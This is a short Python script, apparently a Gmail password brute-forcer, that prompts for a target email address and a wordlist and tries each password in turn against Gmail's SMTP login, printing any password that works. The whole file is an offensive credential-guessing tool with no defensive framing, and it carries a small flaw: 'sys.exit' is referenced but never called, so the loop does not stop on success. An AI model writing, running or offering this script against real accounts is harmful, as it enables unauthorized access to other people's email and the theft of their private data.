import ssl
import smtplib
import time
import sys

def gmailbrute():
    email = input('[$]Enter target email address: ')
    wordlist = input('[$]Enter Wordlist: ')

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as server:
        with open(wordlist, 'r') as rf:
            for index, value in enumerate(rf.readlines()):
                password = value.strip()
                try:
                    server.login(email, password)
                    print('Password found: ', password)
                    time.sleep(10)
                    sys.exit
                except smtplib.SMTPResponseException:
                    print('[!]Password not found: ', password)
                